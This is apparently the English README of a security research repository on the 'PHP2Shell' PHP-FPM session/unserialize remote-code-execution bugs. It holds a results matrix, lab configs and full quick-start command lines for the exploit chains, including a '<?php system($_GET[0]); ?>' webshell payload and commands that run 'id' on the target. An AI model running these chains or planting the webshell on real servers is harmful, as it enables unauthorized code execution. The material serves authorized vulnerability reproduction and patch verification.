# PHP2Shell Research

English | [中文](README.md)

> **Disclaimer**
>
> This project is provided **for authorized security research, vulnerability
> reproduction and defensive validation only**. Any other use — including but
> not limited to unauthorized access, attacks on third-party systems,
> destructive use, mass scanning or commercial abuse — is the sole
> responsibility of the user. The authors accept no liability for any
> consequences. By using this project you confirm that you have explicit
> written authorization from the target owner and that you comply with
> applicable law.

---

## Overview

PHP2Shell is a family of cross-request session/unserialize bugs in PHP
(CVE-2026-109618 / CVE-2026-109619). This repository focuses on the
**PHP-FPM** surface and provides two reproducible research chains:

- a **128M FPM chain**: deterministic `ps_files` arbitrary file write →
  webshell;
- an **8M FPM reclaim chain**: an 8 KB multipart field reclaims the freed
  `php_unserialize_data`, forges a `var_hash`, and fires `zif_system` through a
  fake HashTable destructor.

It also includes profiles, calibration tools, lab configs, research notes and
the full ASCII path map.

---

## Capabilities and status

| Capability | Status | Evidence |
|---|---|---|
| FPM 8.4.26 / 128M / 1 worker | verified | 4/4 `uid=33(www-data)` |
| FPM 8.4.26 / 128M / 4 workers | verified | 4/4 `uid=33(www-data)` |
| Official stripped `php:8.4.26-fpm` / 128M | verified | 1w 3/3 + 4w 1/1 |
| FPM 8.4.26 / 8M reclaim / 1 worker | verified (debug build) | 3/3 `uid=33(www-data)` |
| FPM 8M `no-oracle` with supplied chunk/PIE | verified | 1/1 `uid=33(www-data)` |
| FPM 8M HTTP-only leak + endgame / debug / 1w | verified | 3/3 `uid=33(www-data)` |
| FPM 8M HTTP-only leak + endgame / official stripped / 1w | verified | 3/3 `uid=33(www-data)` |
| FPM 8M HTTP-only leak + endgame / official stripped / 4w | verified | 3/3 `uid=33(www-data)` (3 pinned) |
| PHP 8.5.11 FPM / 128M / 1 child / pure HTTP | verified | gdb-free full chain 3/3 `uid=33`; matrix `fpm-8511-http-1w` |
| PHP 8.2.34 FPM / 128M / 1 child / pure HTTP (real-CVE quadrant) | verified | `PROFILE=8234` port 3/3 `uid=33`; matrix `fpm-8234-http-1w` |
| PHP 8.5.11 FPM / 128M / 4 workers / pure HTTP | verified | `WORKERS=4` lab pinning + `ASSERT4` 3/3 `uid=33` (301 s); matrix `fpm-8511-http-4w` |
| PHP 8.2.34 FPM / 128M / 4 workers / pure HTTP | verified | `PROFILE=8234 WORKERS=4` 3/3 `uid=33` (248.3 s); matrix `fpm-8234-http-4w` |
| PHP 8.2.35 FPM / 128M / 1 child (8.2-branch fix; gate) | verified (`kind=gate`) | fail-closed `PATCH GATE: closed` 3/3 exit 0; 8.2.34 control `OPEN` exit 3; matrix `fpm-8235-gate` |
| PHP 8.5.12 FPM / 128M / 4 workers (patched gate; pin mode) | verified (`kind=gate`) | `WORKERS=4` pinning + `_sleep.php`: `PATCH GATE: closed` 3/3 exit 0; 8.5.11 4w control `OPEN` exit 3; matrix `fpm-8512-gate-4w` |
| PHP 8.2.35 FPM / 128M / 4 workers (patched gate; pin mode) | verified (`kind=gate`) | `PROFILE=8235 WORKERS=4`: `PATCH GATE: closed` 3/3 exit 0 (SR 456 -> 361 -> 698, BG 0); 8.2.34 4w control `OPEN` exit 3; matrix `fpm-8235-gate-4w` |
| PHP 8.3.36 FPM / 128M / 4 workers (patched gate; pin mode) | verified (`kind=gate`) | `PROFILE=8336 WORKERS=4`: `PATCH GATE: closed` 3/3 exit 0 (SR 456 -> 361 -> 698, BG 0 at `+0x360`); 8.3.35 4w control `OPEN` exit 3; matrix `fpm-8336-gate-4w` |
| PHP 8.4.27 FPM / 128M / 4 workers (patched gate; registered, 8.4.26 control OPEN 3/3) | verified (`kind=gate`) | `PROFILE=8427 WORKERS=4`: `PATCH GATE: closed` 3/3 exit 0 (grow 7,050,470, SR 469 -> 374 -> 724, BG 0 at `+0x370`); 8.4.26 4w control `OPEN` 3/3 exit 3 (SR 47/70, x.php 392 B, uid=33); matrix `fpm-8427-gate-4w` |
| clean-room p2s warning chain (mod_php / de=On) | verified | 8M 1w/4w 3/3; 64M–256M 1/1; `oracle=http` |
| clean-room p2s pure128 (de=Off / 128M / chunked) | verified | 1w/5w/150w 3/3, 2w 1/1; `decoded=819200` |
| Profiles / CMS presets | provided | `src/profiles.py`, `src/cms_profiles.py` |
| Layout/smoke tests | pass | 22/22 unit tests, `SMOKE_OK`, `RECLAIM_SMOKE_OK` |

Open research questions:

- 8.3.35 FPM calibration (leak geometry is build-specific);
- WordPress A1 `bin 128` calibration;
- the 8M chain under `pm = dynamic`;
- T2 `psv` phase comparison / T3 second libphp leak channel.

---

## Quick start

Requirements: Python 3.10+ (stdlib only), Docker for the labs, Linux for the
FPM lab.

```bash
python3 -m unittest discover -s tests -v
python3 src/tools/fpm_chain_smoke.py     # SMOKE_OK
python3 src/tools/fpm_reclaim_smoke.py   # RECLAIM_SMOKE_OK
```

### 128M FPM

```bash
php-fpm -D -y /srv/www-1.conf -c /srv/php-128m.ini
nginx -g 'daemon off;'

python3 src/tools/fpm_chain.py \
  --url http://127.0.0.1 --workers 1 --attempts 1 --stages r3 \
  --e-off 0x83000 --dt-off 0x6b000 --writer 0x581e0 \
  --big-dt-size 13312 --big-e-size 45056 \
  --base-dt 0x68018 --base-e 0x81018 \
  --r3-scalars 2 --victim-sid vic --victim-path /sess.php \
  --r3-key '<?php system($_GET[0]); ?>' --r3-dt-used 0 \
  --big 53 --prime-press 400 --plain /index.php --index /index.php
```

### 8M reclaim

```bash
# bases from a lab oracle (gdb / /proc)
python3 src/tools/fpm_reclaim.py \
  --base http://127.0.0.1:8080 --builder http://127.0.0.1:8081 \
  --chunk <chunk> --pie <pie> --zif-offset <off> \
  --d-off 0x6f000 --k 0xfe8 --pads '' --size 8192 \
  --cmd 'id>out/p1' --proof /out/p1

# HTTP only: leak chunk/PIE first, then run the endgame (no debugger)
python3 src/tools/fpm_reclaim.py \
  --base http://127.0.0.1:8080 --builder http://127.0.0.1:8081 \
  --zif-offset 0x50a0f0 --leak --leak-profile official \
  --cmd 'id>out/p1' --proof /out/p1
```

Lab configs and pages are in `labs/fpm/` and `labs/fpm/reclaim/`. `--leak`
recovers chunk/PIE over HTTP via `src/tools/fpm_leak.py`; it works on the debug
build and on the official stripped image. The proof file is the only oracle;
the consumer's 502 is expected.

---

## mod_php chain (clean-room `p2s/`)

`src/p2s/` is a self-implemented MIT implementation of the warning chain
(de=On) and pure128 (de=Off/128M, chunked); it does not need any third-party
upstream code.

```bash
export PYTHONPATH=src
python3 -m p2s.cli -u http://127.0.0.1:19016/index.php --check
python3 -m p2s.cli -u http://127.0.0.1:19016/index.php --run \
  --container <lab> --container-proof /out/p1 \
  --fetch-match uid= --cmd 'id>/out/p1'
python3 -m p2s.cli -u http://127.0.0.1:19068/index.php --pure128 --run \
  --container <lab> --container-proof /out/p1 \
  --fetch-match uid= --cmd 'id>/out/p1'
```

All chains are self-implemented p2s code (MIT); the lab-only `exploit.py` is
**not** in the release, and the release ships no third-party exploit code.

---

## Repository layout

```text
src/            FPM chains, profiles, calibration tools
labs/           PHP-FPM and Apache labs
docs/           research notes, map, reproducibility, licensing
tests/          pure-Python layout/smoke tests
```

---

## Research documentation

| Doc | Content |
|---|---|
| [docs/research/overview.md](docs/research/overview.md) | problem, two FPM endgames, research questions |
| [docs/research/fpm-128m.md](docs/research/fpm-128m.md) | 128M chain: `var_push`, `ps_files`, geometry, proof |
| [docs/research/fpm-8m-reclaim.md](docs/research/fpm-8m-reclaim.md) | 8M reclaim: producer, 8KB reclaim, fake HashTable |
| [docs/research/fpm-8m-http-leak.md](docs/research/fpm-8m-http-leak.md) | 8M HTTP-only chunk/PIE leak, official stripped, 4 workers |
| [docs/research/fpm-8m-prime.md](docs/research/fpm-8m-prime.md) | 8M prime, empty chunk, structural wall |
| [docs/research/methods.md](docs/research/methods.md) | M1–M8 research methods |
| [docs/research/claims.md](docs/research/claims.md) | claims and evidence strength |
| [docs/research/fpm-8511-http.md](docs/research/fpm-8511-http.md) | PHP 8.5.11 / 128M pure-HTTP gdb-free chain (3/3 `uid=33`) |
| [docs/research/fpm-8234-port.md](docs/research/fpm-8234-port.md) | 8.2.34-FPM real-CVE quadrant port (`PROFILE=8234`) |
| [docs/research/fpm-8234-4w.md](docs/research/fpm-8234-4w.md) | 8.2.34-FPM 128M 4-worker pure-HTTP chain (lab pinning + `ASSERT4`) |
| [docs/research/fpm-8511-4w.md](docs/research/fpm-8511-4w.md) | 8.5.11-FPM 128M 4-worker pure-HTTP chain; BG dual-offset fix |
| [docs/research/fpm-8235-gate.md](docs/research/fpm-8235-gate.md) | 8.2.35-FPM fail-closed patch gate (8.2-branch fix) |
| [docs/research/fpm-8512-gate-4w.md](docs/research/fpm-8512-gate-4w.md) | 8.5.12-FPM 4-worker fail-closed patch gate (pin mode; first-run lesson) |
| [docs/research/fpm-8513-readiness.md](docs/research/fpm-8513-readiness.md) | 8.5.13 release-day readiness: status, apiki trap, gate prep, 24h checklist |
| [docs/research/fpm-8235-gate-4w.md](docs/research/fpm-8235-gate-4w.md) | 8.2.35-FPM 4-worker fail-closed patch gate (pin mode) |
| [docs/research/fix-commits-2026-10-31.md](docs/research/fix-commits-2026-10-31.md) | upstream fix commits for CVE-2026-109618/109619 and gate mechanism mapping |
| [docs/research/fpm-8336-gate-4w.md](docs/research/fpm-8336-gate-4w.md) | 8.3.36-FPM 4-worker fail-closed patch gate (pin mode; BG `+0x360`) |
| [docs/research/e7-mechanism-verification.md](docs/research/e7-mechanism-verification.md) | E7 runtime mechanism verification (dynsym/early_rinit/delayed OOM/incomplete-only) |
| [docs/research/fpm-8427-gate-4w-poc.md](docs/research/fpm-8427-gate-4w-poc.md) | 8.4.27-FPM 4-worker gate (calibrated on 8.4.26; registered) |
| [docs/research/gate-family-crossbranch-2026-10-31.md](docs/research/gate-family-crossbranch-2026-10-31.md) | cross-branch gate family full 3x (18/18 gates + 12/12 controls PASS; selector fix) |
| `labs/fpm/r49_release_day_8513.sh` | 8.5.13 release-day pipeline (build -> DIAG -> gate -> 8.5.11 control -> unknown) |
| `labs/fpm/r50_release_day_any.sh` | generic release-day pipeline for any branch gate (FAMILY 82\|83\|84\|85; fail-closed) |
| [docs/research/patch.md](docs/research/patch.md) | patch boundary and gates |
| [docs/research/cms.md](docs/research/cms.md) | CMS matrix and WordPress A1 root cause |
| [docs/research/t2-t3.md](docs/research/t2-t3.md) | T2/T3 research notes |
| [docs/ROADMAP.md](docs/ROADMAP.md) | full ASCII global path map |

---

## Reproduction and verification

- 128M: `docs/research/fpm-128m.md`;
- 8M reclaim: `docs/research/fpm-8m-reclaim.md`;
- 8M HTTP-only leak: `docs/research/fpm-8m-http-leak.md`;
- labs: `labs/fpm/`, `labs/fpm/reclaim/`;
- verification: clear the proof file before the run, require content match
  (e.g. `uid=`), and do not treat a single proof as determinism.

---

## License

Original code in this repository is released under the **MIT License**; see
[LICENSE](LICENSE).

---

## Credits

- **Wiz Research** — PHP2Shell disclosure and analysis;
- **kengwang** — FPM chain and 8M research;
- **cbovin** — profile/offset cross-checks;
- **VABISMO** — 8M reclaim endgame idea;
- **devploit** — research-release engineering structure.

---

## Citation

See [CITATION.cff](CITATION.cff). When citing this repository, please also cite
the original PHP2Shell disclosure by Wiz Research.

---

## ASCII global path map

The full map is at the end of the Chinese [README.md](README.md#ascii-全域路径图).
